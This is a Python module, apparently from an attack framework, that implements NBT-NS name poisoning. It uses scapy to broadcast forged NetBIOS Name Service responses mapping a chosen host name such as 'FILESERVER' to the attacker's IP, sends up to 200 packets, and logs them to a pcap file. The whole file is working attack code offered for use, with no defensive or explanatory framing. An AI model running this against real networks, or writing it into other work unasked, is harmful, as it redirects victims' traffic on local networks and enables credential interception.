import random, struct, time
from scapy.all import Ether, IP, UDP, sendp, get_if_hwaddr, get_if_addr
from attacks.base import BaseAttack


class NbtnsPoison(BaseAttack):
    def run(self):
        spoof_name  = self.params.get("spoof_name", "FILESERVER")[:15].upper()
        count       = int(self.params.get("count", 200))
        attacker_ip = get_if_addr(self.iface)
        src_mac     = get_if_hwaddr(self.iface)
        NBNS_PORT   = 137

        self.log(f"NBT-NS Poison: claiming '{spoof_name}' → {attacker_ip}", "warn")
        writer = self.open_pcap()

        def encode_nb(name: str) -> bytes:
            padded = name.ljust(15)[:15] + "\x00"
            enc = b""
            for c in padded:
                v = ord(c)
                enc += bytes([0x41 + (v >> 4), 0x41 + (v & 0x0F)])
            return enc

        def build_response(txid: int) -> bytes:
            nb_name   = encode_nb(spoof_name)
            name_lbl  = bytes([len(nb_name)]) + nb_name + b"\x00"
            ip_bytes  = bytes(int(x) for x in attacker_ip.split("."))
            header    = struct.pack("!HHHHHH", txid, 0x8500, 0, 1, 0, 0)
            rdata     = struct.pack("!HI", 0x0000, 0) + ip_bytes
            rr        = name_lbl + struct.pack("!HHI", 0x0020, 0x0001, 300) + \
                        struct.pack("!H", len(rdata)) + rdata
            return header + rr

        sent = 0
        while not self._stop.is_set():
            if count and sent >= count:
                break
            payload = build_response(random.randint(1, 0xFFFF))
            pkt = (
                Ether(src=src_mac, dst="ff:ff:ff:ff:ff:ff")
                / IP(src=attacker_ip, dst="255.255.255.255")
                / UDP(sport=NBNS_PORT, dport=NBNS_PORT)
                / payload
            )
            try:
                sendp(pkt, iface=self.iface, verbose=False)
                self.write(pkt)
                sent += 1
                if sent % 50 == 0:
                    self.log(f"NBT-NS Poison: {sent} responses sent", "info")
            except Exception as e:
                self.log(f"NBT-NS error: {e}", "error"); break
            time.sleep(0.1)

        writer.close()
        self.log(f"NBT-NS Poison stopped — {sent} responses sent", "success")
